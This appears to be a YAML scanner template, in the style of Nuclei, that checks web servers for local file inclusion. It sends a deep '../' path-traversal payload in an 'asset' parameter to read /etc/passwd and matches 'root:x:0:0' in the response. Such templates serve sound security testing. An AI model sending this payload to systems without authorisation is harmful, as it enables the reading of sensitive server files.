id: lfi7-210
name: 'Deep traversal in asset'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via asset'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      asset:
        - '../../../../../../../../../../../etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
